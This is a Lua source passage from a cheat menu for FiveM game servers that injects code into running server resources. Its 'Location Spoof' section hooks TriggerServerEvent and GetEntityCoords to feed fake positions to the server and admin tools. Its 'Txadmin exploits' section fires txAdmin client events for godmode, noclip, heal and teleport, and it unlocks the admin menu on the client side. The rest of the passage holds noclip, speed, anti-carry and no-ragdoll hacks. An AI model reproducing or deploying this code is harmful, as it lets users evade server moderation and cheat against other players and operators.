        for _, resourceName in ipairs(resourcePriority) do
            if GetResourceState(resourceName) == "started" then
                table.insert(foundResources, resourceName)
            end
        end
        
        if #foundResources > 0 then
            targetResource = foundResources[math.random(1, #foundResources)]
        else
            local allResources = {}
            for i = 0, GetNumResources() - 1 do
                local resourceName = GetResourceByFindIndex(i)
                if resourceName and GetResourceState(resourceName) == "started" then
                    table.insert(allResources, resourceName)
                end
            end
            if #allResources > 0 then
                targetResource = allResources[math.random(1, #allResources)]
            else
                MachoMenuNotification("Error", "No resources found!")
                return
            end
        end
        
        MachoInjectResource(targetResource, [[
           SetPedConfigFlag(PlayerPedId(), 140, true)
           SetPedConfigFlag(PlayerPedId(), 45, true)
        ]])
        
        MachoMenuNotification("Player", "Enhanced Mode enabled")
    end,
    function()
        local targetResource = nil
        local resourcePriority = {"any", "any", "any"}
        local foundResources = {}
        
        for _, resourceName in ipairs(resourcePriority) do
            if GetResourceState(resourceName) == "started" then
                table.insert(foundResources, resourceName)
            end
        end
        
        if #foundResources > 0 then
            targetResource = foundResources[math.random(1, #foundResources)]
        else
            local allResources = {}
            for i = 0, GetNumResources() - 1 do
                local resourceName = GetResourceByFindIndex(i)
                if resourceName and GetResourceState(resourceName) == "started" then
                    table.insert(allResources, resourceName)
                end
            end
            if #allResources > 0 then
                targetResource = allResources[math.random(1, #allResources)]
            end
        end
        
        if targetResource then
            MachoInjectResource(targetResource, [[
                SetPedConfigFlag(PlayerPedId(), 140, false)
                SetPedConfigFlag(PlayerPedId(), 45, false)
            ]])
            
            MachoMenuNotification("Player", "Enhanced Mode disabled")
        end
    end
)
MachoMenuCheckbox(GeneralLeftSection, "Location Spoof [DESYNC MODE]", 
    function()
        enableLocationSpoof = true
        local fakeCoords = vector3(-1037.0, -2737.0, 20.0) -- Los Santos Airport

        CreateThread(function()
            while enableLocationSpoof do
                local targetResource = nil
                local resourcePriority = {"any", "any", "anya"}
                local foundResources = {}

                for _, res in ipairs(resourcePriority) do
                    if GetResourceState(res) == "started" then
                        table.insert(foundResources, res)
                    end
                end

                if #foundResources > 0 then
                    targetResource = foundResources[math.random(1, #foundResources)]
                else
                    for i = 0, GetNumResources() - 1 do
                        local res = GetResourceByFindIndex(i)
                        if res and GetResourceState(res) == "started" then
                            table.insert(foundResources, res)
                        end
                    end
                    if #foundResources > 0 then
                        targetResource = foundResources[math.random(1, #foundResources)]
                    end
                end

                if targetResource then
                    MachoInjectResource(targetResource, [[
                        local fakeX, fakeY, fakeZ = ]] .. fakeCoords.x .. [[, ]] .. fakeCoords.y .. [[, ]] .. fakeCoords.z .. [[

                        -- Save originals
                        local originalTriggerServerEvent = TriggerServerEvent
                        local originalGetEntityCoords = GetEntityCoords
                        local originalSetEntityCoordsNoOffset = SetEntityCoordsNoOffset

                        -- Override position reporting
                        TriggerServerEvent = function(eventName, ...)
                            local args = {...}
                            if string.find(eventName:lower(), "position") or string.find(eventName:lower(), "coord") or string.find(eventName:lower(), "location") then
                                for i, arg in ipairs(args) do
                                    if type(arg) == "table" and arg.x and arg.y and arg.z then
                                        args[i] = {x = fakeX, y = fakeY, z = fakeZ}
                                    end
                                end
                            end
                            return originalTriggerServerEvent(eventName, table.unpack(args))
                        end

                        -- Spoof coords to admin tools
                        GetEntityCoords = function(entity, alive)
                            if entity == PlayerPedId() then
                                return vector3(fakeX, fakeY, fakeZ)
                            end
                            return originalGetEntityCoords(entity, alive)
                        end

                        -- Desync: Force local ped to be far from server coords
                        CreateThread(function()
                            while true do
                                local ped = PlayerPedId()
                                -- Rapid micro movements around the fake location
                                local jitter = math.random(-2,2) + 0.001 * math.random()
                                local fx, fy, fz = fakeX + jitter, fakeY - jitter, fakeZ
                                originalSetEntityCoordsNoOffset(ped, fx, fy, fz, false, false, false)

                                Wait(100 + math.random(20, 80))
                            end
                        end)
                    ]])
                end

                Wait(2000)
            end
        end)
    end,
    function()
        enableLocationSpoof = false

        local targetResource = nil
        local resourcePriority = {"any", "spawnmanager", "sessionmanager"}
        for _, res in ipairs(resourcePriority) do
            if GetResourceState(res) == "started" then
                targetResource = res
                break
            end
        end

        if targetResource then
            MachoInjectResource(targetResource, [[
                -- Cleanup and restore original behavior
                collectgarbage()
            ]])
        end
    end
)

MachoMenuCheckbox(GeneralLeftSection, "Anti Teleport (Player Detection)", 
   function()
       antiTpLoop = true
       
       -- Reset everything on activation
       originalPosition = nil
       lastSafePosition = nil
       initializationComplete = false
       teleportCooldown = 0
       
       MachoMenuNotification("Anti TP", "Initializing player-based protection...")
       
       Citizen.CreateThread(function()
           -- Initialization phase
           Citizen.Wait(1000)
           local playerPed = PlayerPedId()
           originalPosition = GetEntityCoords(playerPed)
           lastSafePosition = originalPosition
           initializationComplete = true
           MachoMenuNotification("Anti TP", " Player-detection protection active")
           
           while antiTpLoop do
               Citizen.Wait(50)
               
               if initializationComplete then
                   local playerPed = PlayerPedId()
                   local playerCoords = GetEntityCoords(playerPed)
                   local currentTime = GetGameTimer()
                   
                   if originalPosition ~= nil then
                       local distance = #(playerCoords - originalPosition)
                       
                       -- Only check if cooldown has passed
                       if currentTime > teleportCooldown then
                           -- Check for suspicious teleportation (moved more than 30 meters)
                           if distance > 30.0 then
                               -- Look for nearby players at the new location
                               local nearbyPlayers = {}
                               
                               for i = 0, 255 do
                                   if i ~= PlayerId() and NetworkIsPlayerActive(i) then
                                       local otherPlayer = GetPlayerPed(i)
                                       if DoesEntityExist(otherPlayer) then
                                           local otherPos = GetEntityCoords(otherPlayer)
                                           local distanceToOther = #(playerCoords - otherPos)
                                           
                                           -- If there's a player within 1 meter of teleport destination
                                           if distanceToOther <= 1.0 then
                                               local playerName = GetPlayerName(i) or "Unknown"
                                               local playerId = GetPlayerServerId(i) or 0
                                               
                                               table.insert(nearbyPlayers, {
                                                   name = playerName,
                                                   serverId = playerId,
                                                   clientId = i,
                                                   distance = distanceToOther
                                               })
                                           end
                                       end
                                   end
                               end
                               
                               -- If there are nearby players, it's likely a malicious teleport
                               if #nearbyPlayers > 0 then
                                   -- Use last safe position instead of original
                                   local safePos = lastSafePosition or originalPosition
                                   
                                   -- Ensure safe position is valid
                                   if safePos and safePos.x and safePos.y and safePos.z then
                                       SetEntityCoords(playerPed, safePos.x, safePos.y, safePos.z, false, false, false, true)
                                       SetEntityVelocity(playerPed, 0.0, 0.0, 0.0)
                                       
                                       -- Set cooldown to prevent spam
                                       teleportCooldown = currentTime + 1000
                                       
                                       -- Send detailed notification
                                       for _, player in ipairs(nearbyPlayers) do
                                           MachoMenuNotification(" TELEPORT BLOCKED", 
                                               string.format("Player: %s | ID: %d | Server ID: %d", 
                                               player.name, player.clientId, player.serverId))
                                           break -- Show only first player to avoid spam
                                       end
                                       
                                       -- Don't update originalPosition after teleport block
                                       Citizen.Wait(500)
                                       originalPosition = GetEntityCoords(playerPed)
                                   end
                               else
                                   -- Check for other suspicious activity
                                   local currentVelocity = GetEntityVelocity(playerPed)
                                   local actualSpeed = #currentVelocity
                                   local vehicle = GetVehiclePedIsIn(playerPed, false)
                                   local interiorId = GetInteriorFromEntity(playerPed)
                                   
                                   -- Allow legitimate teleports (interiors, vehicles, etc.)
                                   if interiorId ~= 0 or vehicle ~= 0 or actualSpeed > 5.0 then
                                       -- Legitimate teleport - update positions
                                       originalPosition = playerCoords
                                       lastSafePosition = playerCoords
                                   elseif distance > 100.0 then
                                       -- Very suspicious teleport - block it
                                       local safePos = lastSafePosition or originalPosition
                                       if safePos and safePos.x and safePos.y and safePos.z then
                                           SetEntityCoords(playerPed, safePos.x, safePos.y, safePos.z, false, false, false, true)
                                           teleportCooldown = currentTime + 1000
                                           MachoMenuNotification(" SUSPICIOUS TELEPORT", "Blocked long-distance teleport")
                                           Citizen.Wait(500)
                                           originalPosition = GetEntityCoords(playerPed)
                                       end
                                   else
                                       -- Allow and update
                                       originalPosition = playerCoords
                                       lastSafePosition = playerCoords
                                   end
                               end
                           else
                               -- Normal movement - update positions
                               originalPosition = playerCoords
                               
                               -- Update safe position only for short distances
                               if distance < 15.0 then
                                   lastSafePosition = playerCoords
                               end
                           end
                       else
                           -- During cooldown, just update original position for next check
                           originalPosition = playerCoords
                       end
                   else
                       -- Initialize position
                       originalPosition = playerCoords
                       lastSafePosition = playerCoords
                   end
               end
           end
       end)
   end,
   function()
       antiTpLoop = false
       originalPosition = nil
       lastSafePosition = nil
       initializationComplete = false
       teleportCooldown = 0
       MachoMenuNotification("Anti TP", "Deactivated")
   end
)

local autoResetLoop = false

MachoMenuCheckbox(GeneralLeftSection, "Auto Reset", 
   function()
       autoResetLoop = true
       MachoMenuNotification("Auto Reset", "Activated - Character resets every 0.1 seconds")
       
       Citizen.CreateThread(function()
           while autoResetLoop do
               local playerPed = PlayerPedId()
               
               -- Reset character health and states without affecting camera
               SetEntityHealth(playerPed, GetEntityMaxHealth(playerPed))
               SetPedArmour(playerPed, GetPlayerMaxArmour(PlayerId()))
               
               -- Clear all damage and effects
               ClearPedBloodDamage(playerPed)
               ClearPedWetness(playerPed)
               ClearPedEnvDirt(playerPed)
               ClearPedDamageDecalByZone(playerPed, 0, "ALL")
               ClearPedDamageDecalByZone(playerPed, 1, "ALL")
               ClearPedDamageDecalByZone(playerPed, 2, "ALL")
               ClearPedDamageDecalByZone(playerPed, 3, "ALL")
               ClearPedDamageDecalByZone(playerPed, 4, "ALL")
               ClearPedDamageDecalByZone(playerPed, 5, "ALL")
               
               -- Reset animation and movement states
               if not IsPedInAnyVehicle(playerPed, false) then
                   ClearPedTasks(playerPed)
                   ClearPedSecondaryTask(playerPed)
               end
               
               -- Reset facial expressions and emotions
               ClearFacialIdleAnimOverride(playerPed)
               
               -- Reset any stuck states
               SetPedCanRagdoll(playerPed, true)
               SetPedCanRagdoll(playerPed, false)
               
               -- Reset stamina
               RestorePlayerStamina(PlayerId(), 1.0)
               
               Citizen.Wait(100) -- 0.1 seconds = 100ms
           end
       end)
   end,
   function()
       autoResetLoop = false
       MachoMenuNotification("Auto Reset", "Deactivated - Auto reset stopped")
   end
)
local antiCarryLoop = false
local lastFreePosition = nil

MachoMenuCheckbox(GeneralLeftSection, "Anti Carry & Drag", 
   function()
       antiCarryLoop = true
       local playerPed = PlayerPedId()
       lastFreePosition = GetEntityCoords(playerPed)
       MachoMenuNotification("Anti Carry & Drag", "Activated - Protected from being carried")
       
       Citizen.CreateThread(function()
           while antiCarryLoop do
               local playerPed = PlayerPedId()
               
               -- Check if player is being carried or attached
               if IsEntityAttached(playerPed) then
                   -- Get who is carrying/attached to
                   local attachedTo = GetEntityAttachedTo(playerPed)
                   
                   if DoesEntityExist(attachedTo) then
                       -- Check if attached to another player
                       local isAttachedToPlayer = false
                       local carrierInfo = "Unknown"
                       
                       for i = 0, 255 do
                           if i ~= PlayerId() and NetworkIsPlayerActive(i) then
                               local otherPlayerPed = GetPlayerPed(i)
                               if otherPlayerPed == attachedTo then
                                   isAttachedToPlayer = true
                                   local playerName = GetPlayerName(i) or "Unknown"
                                   local serverId = GetPlayerServerId(i) or 0
                                   carrierInfo = string.format("%s (ID: %d, Server: %d)", playerName, i, serverId)
                                   break
                               end
                           end
                       end
                       
                       -- Detach from player carries
                       if isAttachedToPlayer then
                           DetachEntity(playerPed, true, true)
                           
                           -- Return to last safe position
                           if lastFreePosition then
                               SetEntityCoords(playerPed, lastFreePosition.x, lastFreePosition.y, lastFreePosition.z, false, false, false, true)
                           end
                           
                           -- Clear any carry animations
                           ClearPedTasks(playerPed)
                           ClearPedSecondaryTask(playerPed)
                           
                           MachoMenuNotification(" Carry & Drag BLOCKED", 
                               string.format("Prevented Carry & Drag by: %s", carrierInfo))
                       end
                   end
               else
                   -- Not attached - update safe position
                   local currentPos = GetEntityCoords(playerPed)
                   
                   -- Only update if player is not in a weird state
                   if not IsPedRagdoll(playerPed) and not IsPedBeingStunned(playerPed) then
                       lastFreePosition = currentPos
                   end
               end
               
               -- Also prevent pickup animations
               if IsPedBeingStunned(playerPed, 0) then
                   SetPedToRagdoll(playerPed, 1, 1, 0, 0, 0, 0)
                   ClearPedTasks(playerPed)
               end
               
               -- Prevent being grabbed
               if GetPedConfigFlag(playerPed, 292, true) then -- PED_CONFIG_FLAG_DisableMelee
                   SetPedConfigFlag(playerPed, 292, false)
               end
               
               Citizen.Wait(100)
           end
       end)
   end,
   function()
       antiCarryLoop = false
       lastFreePosition = nil
       MachoMenuNotification("Anti Carry & Drag", "Deactivated")
   end
)
MachoMenuText(GeneralLeftSection,"Txadmin exploits")


    MachoMenuButton(GeneralLeftSection, "Check Txadmin", function()
    local resourceState = GetResourceState("monitor")
    if resourceState == "started" or resourceState == "starting" then
        MachoMenuNotification("Txadmin Found", "sucsess")
    else
        MachoMenuNotification("Txadmin Not Found", "Faild")
    end
    end)

    MachoMenuButton(GeneralLeftSection, "Tp to Waypoint", function()
        MachoInjectResource('monitor', [[TriggerEvent("txcl:tpToWaypoint")]])
        MachoMenuNotification("sucsess", "TxAdmin TPW")
    end)
    MachoMenuButton(GeneralLeftSection, "Txadmin heal", function()
        MachoInjectResource('monitor', [[TriggerEvent('txcl:heal')]])
        MachoMenuNotification("sucsess", "Txadmin heal")
    end)

    MachoMenuButton(GeneralLeftSection, "Vehicle boost", function()
        MachoInjectResource('monitor', [[TriggerEvent('txcl:vehicle:boost')]])
        MachoMenuNotification("sucsess", "Vehicle boost")
    end)
    MachoMenuButton(GeneralLeftSection, "Vehicle fix", function()
        MachoInjectResource('monitor', [[TriggerEvent('txcl:vehicle:fix')]])
        MachoMenuNotification("sucsess", "Vehicle fix")
    end)
    MachoMenuButton(GeneralLeftSection, "Txadmin menu client side acc", function()
    MachoInjectResource('monitor', [[menuIsAccessible = true]])
    MachoMenuNotification("Menu Access", "TxAdmin menu access Activated")
    end)
    local selectedKey = 0
    MachoMenuKeybind(GeneralLeftSection, "Tp to Waypoint Key", 0, function(key, toggle)
    selectedKey = key
    end)

    MachoOnKeyDown(function(key)
        if key == selectedKey then
         MachoInjectResource('monitor', [[TriggerEvent("txcl:tpToWaypoint")]])
        MachoMenuNotification("sucsess", "TxAdmin TPW")
        end
    end)
    MachoMenuCheckbox(GeneralLeftSection, "Show Player IDs", 
        function()
            isPlayerIdsEnabled = true
            startPlayerIdThread()
        end,
        function()
            isPlayerIdsEnabled = false
        end
    )

    MachoMenuCheckbox(GeneralLeftSection, "Txadmin Superjump", 
        function()
            MachoInjectResource('monitor', [[TriggerEvent('txcl:setPlayerMode', 'superjump', true)]])
            MachoMenuNotification("Superjump", "Superjump Activated")
        end,
        function()
            MachoInjectResource('monitor', [[TriggerEvent('txcl:setPlayerMode', 'none', nil)]])
            MachoMenuNotification("Superjump", "Superjump Deactivated")
        end
    )
    MachoMenuCheckbox(GeneralLeftSection, "Txadmin Noclip", 
        function()
            MachoInjectResource('monitor', [[TriggerEvent('txcl:setPlayerMode', 'noclip', true)]])
            MachoMenuNotification("Noclip", "Noclip Activated")
        end,
        function()
            MachoInjectResource('monitor', [[TriggerEvent('txcl:setPlayerMode', 'none', nil)]])
            MachoMenuNotification("Noclip", "Noclip Deactivated")
        end
    )
    local selectedKey = 0
    local nocliptx = flase
    MachoMenuKeybind(GeneralLeftSection, "Txadmin Noclip Key", 0, function(key, toggle)
    selectedKey = key
    end)

    MachoOnKeyDown(function(key)
        if key == selectedKey then
            if not nocliptx then
                nocliptx = true
                MachoInjectResource('monitor', [[TriggerEvent('txcl:setPlayerMode', 'noclip', true)]])
                MachoMenuNotification("Txadmin Noclip", "Txadmin Noclip activated")
            else
                nocliptx = false
                MachoInjectResource('monitor', [[TriggerEvent('txcl:setPlayerMode', 'none', nil)]])
                MachoMenuNotification("Txadmin Noclip", "Txadmin Noclip deactivate")
            end
        end
    end)

    MachoMenuCheckbox(GeneralLeftSection, "Txadmin Goodmode", 
        function()
            MachoInjectResource('monitor', [[TriggerEvent('txcl:setPlayerMode', 'godmode', true)]])
            MachoMenuNotification("Godmode", "Godmode Activated")
        end,
        function()
            MachoInjectResource('monitor', [[TriggerEvent('txcl:setPlayerMode', 'none', nil)]])
            MachoMenuNotification("Godmode", "Godmode Deactivated")
        end
    )
    local GeneralRightTop = MachoMenuGroup(GeneralTab, "free cam", 
        TabsBarWidth + LeftSectionWidth + 10, 5 + MachoPaneGap, 
        MenuSize.x - 5, 5 + MachoPaneGap + RightSectionHeight)

         MachoMenuText(GeneralRightTop,"i will add it")
    local glovalGeneralRightBottom = MachoMenuGroup(GeneralTab, "Movments", 
        TabsBarWidth + LeftSectionWidth + 10, 5 + MachoPaneGap + RightSectionHeight + 5, 
        MenuSize.x - 5, MenuSize.y - 5)
isNoclipEnabled = false
noclipSpeed = 1.0
local pendingNoclipSpeed = 1.0
local lastSliderValue = 10
local lastSliderUpdate = 0
local speedChangePending = false
local speedChangeTimer = 0

local noclipSpeedSliderValue = 10
local NoClipSpeedSlider = MachoMenuSlider(glovalGeneralRightBottom, "SkyDive", 10, 1, 500, "%", 0, function(Value)
    local currentTime = GetGameTimer()
    if Value ~= lastSliderValue and currentTime - lastSliderUpdate >= 100 then
        noclipSpeedSliderValue = Value
        pendingNoclipSpeed = Value / 10
        lastSliderValue = Value
        lastSliderUpdate = currentTime
        speedChangePending = true
        speedChangeTimer = currentTime
    end
end)

MachoMenuCheckbox(glovalGeneralRightBottom, "SkyDive", 
    function()
        isNoclipEnabled = true
        local me = PlayerPedId()
        TaskSkyDive(me)
        MachoMenuNotification("SkyDive", "SkyDive activated")
    end,
    function()
        isNoclipEnabled = false
        local me = PlayerPedId()
        ClearPedTasks(me)
        MachoMenuNotification("SkyDive", "SkyDive deactivate")
    end

)
local selectedKey = 0

MachoMenuKeybind(glovalGeneralRightBottom, "SkyDive Key", 0, function(key, toggle)
    selectedKey = key
end)

MachoOnKeyDown(function(key)
    if key == selectedKey then
        if not isNoclipEnabled then
            isNoclipEnabled = true
            local me = PlayerPedId()
            TaskSkyDive(me)
            MachoMenuNotification("SkyDive", "SkyDive activated")
        else
            isNoclipEnabled = false
            local me = PlayerPedId()
            ClearPedTasks(me)
            MachoMenuNotification("SkyDive", "SkyDive deactivate")
        end
    end
end)

CreateThread(function()
    local me = PlayerPedId()
    local isInVehicle = false
    local shakeCounter = 0

    while true do
        Wait(0)

        local vehicle = GetVehiclePedIsIn(me, false)
        isInVehicle = vehicle ~= nil and vehicle ~= 0

        noclipSpeed = pendingNoclipSpeed

        if speedChangePending and isNoclipEnabled then
            local currentTime = GetGameTimer()
            if currentTime - speedChangeTimer >= 500 then
                isNoclipEnabled = false
                ClearPedTasks(me)
                Wait(0)
                isNoclipEnabled = true
                TaskSkyDive(me)
                speedChangePending = false
            end
        end

        if isNoclipEnabled then
            shakeCounter = shakeCounter + 1
            if shakeCounter >= 10 then
                StopGameplayCamShaking(true)
                ShakeGameplayCam("SKY_DIVING_SHAKE", 0.0)
                shakeCounter = 0
            end

            FreezeEntityPosition(me, true, false)
            SetEntityInvincible(me, true)

            if isInVehicle then
                SetEntityInvincible(vehicle, true)
            end

            if not isInVehicle then
                local x, y, z = table.unpack(GetEntityCoords(me, true))
                local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(PlayerPedId())
                local pitch = GetGameplayCamRelativePitch()

                local dx = -math.sin(heading * math.pi / 180.0)
                local dy = math.cos(heading * math.pi / 180.0)
                local dz = math.sin(pitch * math.pi / 180.0)

                local len = math.sqrt(dx * dx + dy * dy + dz * dz)
                if len ~= 0 then
                    dx = dx / len
                    dy = dy / len
                    dz = dz / len
                end

                local speed = noclipSpeed

                SetEntityVelocity(me, 0.0, 0.0, 0.0)

                local deltaTime = GetFrameTime()
                speed = speed * deltaTime * 60

                if IsControlPressed(0, 32) then
                    x = x + speed * dx
                    y = y + speed * dy
                    z = z + speed * dz
                end

                if IsControlPressed(0, 34) then
                    local leftVector = vector3(-dy, dx, 0.0)
                    x = x + speed * leftVector.x
                    y = y + speed * leftVector.y
                end

                if IsControlPressed(0, 269) then
                    x = x - speed * dx
                    y = y - speed * dy
                    z = z - speed * dz
                end

                if IsControlPressed(0, 9) then
                    local rightVector = vector3(dy, -dx, 0.0)
                    x = x + speed * rightVector.x
                    y = y + speed * rightVector.y
                end

                if IsControlPressed(0, 22) then
                    z = z + speed
                end

                if IsControlPressed(0, 62) then
                    z = z - speed
                end

                SetEntityCoordsNoOffset(me, x, y, z, true, true, true)
                SetEntityHeading(me, heading)
            else
                local x, y, z = table.unpack(GetEntityCoords(vehicle, true))
                local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(vehicle)
                local pitch = GetGameplayCamRelativePitch()

                local dx = -math.sin(heading * math.pi / 180.0)
                local dy = math.cos(heading * math.pi / 180.0)
                local dz = math.sin(pitch * math.pi / 180.0)

                local len = math.sqrt(dx * dx + dy * dy + dz * dz)
                if len ~= 0 then
                    dx = dx / len
                    dy = dy / len
                    dz = dz / len
                end

                local speed = noclipSpeed

                local deltaTime = GetFrameTime()
                speed = speed * deltaTime * 60

                if IsControlPressed(0, 32) then
                    x = x + speed * dx
                    y = y + speed * dy
                    z = z + speed * dz
                end

                if IsControlPressed(0, 34) then
                    local leftVector = vector3(-dy, dx, 0.0)
                    x = x + speed * leftVector.x
                    y = y + speed * leftVector.y
                end

                if IsControlPressed(0, 269) then
                    x = x - speed * dx
                    y = y - speed * dy
                    z = z - speed * dz
                end

                if IsControlPressed(0, 9) then
                    local rightVector = vector3(dy, -dx, 0.0)
                    x = x + speed * rightVector.x
                    y = y + speed * rightVector.y
                end

                if IsControlPressed(0, 22) then
                    z = z + speed
                end

                if IsControlPressed(0, 62) then
                    z = z - speed
                end

                SetEntityCoordsNoOffset(vehicle, x, y, z, true, true, true)
                SetEntityHeading(vehicle, heading)
            end
        else
            SetEntityInvincible(me, false)
            FreezeEntityPosition(me, false, true)

            if isInVehicle then
                SetEntityInvincible(vehicle, false)
            end
        end
    end
end)
local superSpeedLoop = false
MachoMenuCheckbox(glovalGeneralRightBottom, "Fast run", 
   function()
       superSpeedLoop = true
       MachoMenuNotification("Fast run", "Activated")
       
       Citizen.CreateThread(function()
           while superSpeedLoop do
               local playerPed = PlayerPedId()
               SetRunSprintMultiplierForPlayer(PlayerId(), 3.0)
               SetSwimMultiplierForPlayer(PlayerId(), 3.0)
               SetPedMoveRateOverride(playerPed, 2.5)
               
               -- Alternative speed boost
               if IsPedRunning(playerPed) or IsPedSprinting(playerPed) then
                   local forwardVector = GetEntityForwardVector(playerPed)
                   local velocity = GetEntityVelocity(playerPed)
                   SetEntityVelocity(playerPed, 
                       velocity.x + forwardVector.x * 0.5, 
                       velocity.y + forwardVector.y * 0.5, 
                       velocity.z
                   )
               end
               
               Citizen.Wait(0)
           end
           
           local playerPed = PlayerPedId()
           SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
           SetSwimMultiplierForPlayer(PlayerId(), 1.0)
           SetPedMoveRateOverride(playerPed, 1.0)
       end)
   end,
   function()
       superSpeedLoop = false
       MachoMenuNotification("Fast run", "Deactivated")
   end
)
local superJumpLoop = false
MachoMenuCheckbox(glovalGeneralRightBottom, "Super Jump", 
    function()
        superJumpLoop = true
        MachoMenuNotification("Super Jump", "Activated")
        
        Citizen.CreateThread(function()
            while superJumpLoop do
                SetSuperJumpThisFrame(PlayerId())
                Citizen.Wait(0)
            end
        end)
    end,
    function()
        superJumpLoop = false
        MachoMenuNotification("Super Jump", "Deactivated")
    end
)
MachoMenuCheckbox(glovalGeneralRightBottom, "No Ragdoll", 
  function()
      fullNoRagdollLoop = true
      MachoMenuNotification("Full No Ragdoll", "Activated")
      
      Citizen.CreateThread(function()
          while fullNoRagdollLoop do
              local playerPed = PlayerPedId()
              
              -- تعطيل كامل لجميع أنواع Ragdoll
              SetPedConfigFlag(playerPed, 33, true)
              SetPedConfigFlag(playerPed, 461, true)   -- DieWhenRagdoll
              SetPedConfigFlag(playerPed, 89, true)   -- DontActivateRagdollFromAnyPedImpact
              SetPedConfigFlag(playerPed, 106, true)  -- DontActivateRagdollFromVehicleImpact
              SetPedConfigFlag(playerPed, 107, true)  -- DontActivateRagdollFromBulletImpact
              SetPedConfigFlag(playerPed, 108, true)  -- DontActivateRagdollFromExplosions
              SetPedConfigFlag(playerPed, 109, true)  -- DontActivateRagdollFromFire
              SetPedConfigFlag(playerPed, 110, true)  -- DontActivateRagdollFromElectrocution
              SetPedConfigFlag(playerPed, 160, true)  -- DontActivateRagdollFromImpactObject
              SetPedConfigFlag(playerPed, 161, true)  -- DontActivateRagdollFromMelee
              SetPedConfigFlag(playerPed, 162, true)  -- DontActivateRagdollFromWaterJet
              SetPedConfigFlag(playerPed, 163, true)  -- DontActivateRagdollFromDrowning
              SetPedConfigFlag(playerPed, 164, true)  -- DontActivateRagdollFromFalling
              SetPedConfigFlag(playerPed, 165, true)  -- DontActivateRagdollFromRubberBullet
              SetPedConfigFlag(playerPed, 198, true)
              SetPedConfigFlag(playerPed, 314, true)  -- DontActivateRagdollOnPedCollisionWhenDead
              SetPedConfigFlag(playerPed, 199, true)  -- DontActivateRagdollOnVehicleCollisionWhenDead
              SetPedConfigFlag(playerPed, 235, true)  -- AllowBlockDeadPedRagdollActivation
              SetPedConfigFlag(playerPed, 260, true)  -- SuppressLowLODRagdollSwitchWhenCorpseSettles
              SetPedConfigFlag(playerPed, 306, true)  -- DontActivateRagdollFromPlayerPedImpact
              SetPedConfigFlag(playerPed, 307, true)  -- DontActivateRagdollFromAiRagdollImpact
              SetPedConfigFlag(playerPed, 308, true)  -- DontActivateRagdollFromPlayerRagdollImpact
              SetPedConfigFlag(playerPed, 336, true)  -- DontActivateRagdollForVehicleGrab
              SetPedConfigFlag(playerPed, 367, true)
              SetPedConfigFlag(playerPed, 301, true)  -- DontActivateRagdollFromSmokeGrenade
              
              -- تعطيل جميع القدرات على Ragdoll
              SetPedConfigFlag(playerPed, 151, false) -- CanActivateRagdollWhenVehicleUpsideDown
              SetPedConfigFlag(playerPed, 227, false) -- ForceRagdollUponDeath
              SetPedConfigFlag(playerPed, 287, false) -- RagdollingOnBoat
              SetPedConfigFlag(playerPed, 318, false) -- ActivateRagdollFromMinorPlayerContact
              SetPedConfigFlag(playerPed, 460, false) -- RagdollFloatsIndefinitely
              
              -- تعطيل مباشر ونهائي
              SetPedCanRagdoll(playerPed, false)
              SetPedCanRagdollFromPlayerImpact(playerPed, false)
              
              -- منع أي ragdoll قسري
              if IsPedRagdoll(playerPed) then
                  SetPedToRagdoll(playerPed, 0, 0, 0, false, false, false)
              end
              
              Citizen.Wait(50) -- تحديث سريع جداً
          end
          
          -- استعادة Ragdoll الطبيعي عند التعطيل
          local playerPed = PlayerPedId()
          SetPedCanRagdoll(playerPed, true)
          SetPedCanRagdollFromPlayerImpact(playerPed, true)
          
          -- إعادة تفعيل الفلاقات الطبيعية
          SetPedConfigFlag(playerPed, 33, false)
          SetPedConfigFlag(playerPed, 89, false)
          SetPedConfigFlag(playerPed, 106, false)
          SetPedConfigFlag(playerPed, 107, false)
          SetPedConfigFlag(playerPed, 314, false)
          SetPedConfigFlag(playerPed, 108, false)
          SetPedConfigFlag(playerPed, 109, false)
          SetPedConfigFlag(playerPed, 110, false)
          SetPedConfigFlag(playerPed, 151, true)
          SetPedConfigFlag(playerPed, false, true)
          SetPedConfigFlag(playerPed, 160, false)
          SetPedConfigFlag(playerPed, 161, false)
          SetPedConfigFlag(playerPed, 162, false)
          SetPedConfigFlag(playerPed, 163, false)
          SetPedConfigFlag(playerPed, 164, false)
          SetPedConfigFlag(playerPed, 165, false)
          SetPedConfigFlag(playerPed, 198, false)
          SetPedConfigFlag(playerPed, 199, false)
          SetPedConfigFlag(playerPed, 227, true)
          SetPedConfigFlag(playerPed, 235, false)
          SetPedConfigFlag(playerPed, 461, false)
          SetPedConfigFlag(playerPed, 260, false)
          SetPedConfigFlag(playerPed, 287, true)
          SetPedConfigFlag(playerPed, 306, false)
          SetPedConfigFlag(playerPed, 307, false)
          SetPedConfigFlag(playerPed, 308, false)
          SetPedConfigFlag(playerPed, 318, true)
          SetPedConfigFlag(playerPed, 336, false)
          SetPedConfigFlag(playerPed, 367, false)
          SetPedConfigFlag(playerPed, 460, true)
      end)
  end,
  function()
      fullNoRagdollLoop = false
      MachoMenuNotification("No Ragdoll", "Deactivated")
  end
)
local staminaLoop = false
MachoMenuCheckbox(glovalGeneralRightBottom, "Infinite Stamina", 
    function()
        staminaLoop = true
        MachoMenuNotification("Infinite Stamina", "Activated")
        
        Citizen.CreateThread(function()
            while staminaLoop do
                RestorePlayerStamina(PlayerId(), 1.0)
                Citizen.Wait(100)
            end
        end)
    end,
    function()
        staminaLoop = false
        MachoMenuNotification("Infinite Stamina", "Deactivated")
    end
)

    
    local SectionChildWidth = MenuSize.x - TabsBarWidth
    local EachSectionWidth = (SectionChildWidth - 20) / 2 -- Adjusted for two sections

    local destroyer = MachoMenuAddTab(MenuWindow, "Vehicle")
    local sdSERVERCFWSectionChildWidth = MenuSize.x - TabsBarWidth
    local sdSERVERCFWEachSectionWidth = (sdSERVERCFWSectionChildWidth - 20) / 2

    local oyer = MachoMenuGroup(destroyer, "Vehicle & Self", 
        TabsBarWidth + 5, 5 + MachoPaneGap, 
    TabsBarWidth + sdSERVERCFWEachSectionWidth, MenuSize.y - 5)

        local VehicleCheck = MachoMenuGroup(destroyer, "Vehicle & CheckBox", 
        TabsBarWidth + EachSectionWidth + 10, 5 + MachoPaneGap, 
        MenuSize.x - 5, MenuSize.y - 5)
        
        
-- RGB Vehicle Color System
local redValue = 255
local greenValue = 255
local blueValue = 255

-- Function to apply colors automatically
local function applyRGBColor()
    local playerPed = PlayerPedId()
    
    if IsPedInAnyVehicle(playerPed, false) then
        local vehicle = GetVehiclePedIsIn(playerPed, false)
        
        -- Apply RGB colors to vehicle
